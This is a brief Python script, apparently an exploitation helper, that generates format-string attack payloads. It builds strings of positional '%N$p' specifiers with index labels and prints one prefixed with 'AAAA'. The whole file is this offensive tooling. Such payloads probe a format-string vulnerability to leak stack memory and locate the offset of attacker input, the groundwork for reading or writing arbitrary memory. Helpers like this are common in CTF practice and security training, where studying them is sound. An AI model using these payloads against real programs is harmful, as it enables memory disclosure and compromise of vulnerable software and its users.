def create_fmt(start, end=0, atleast=10, max_len=-1,
               with_index=False, specifier="p", separator='|'):
    end = start + atleast if end == 0 else end

    if with_index:
        fmt = "{separator}{i}=%{i}${specifier}"
    else:
        fmt = "{separator}%{i}${specifier}"

    rt = ""

    for i in range(start, end + 1):
        rt += fmt.format(i=i, specifier=specifier, separator=separator)

    if max_len <= 0:
        return rt

    rt = rt[:max_len]

    if rt and rt[-1] != specifier:
        rt = separator.join(rt.split(separator)[:-1])

    return rt


payload = create_fmt(1, 15, with_index=True)
print("AAAA" + payload)
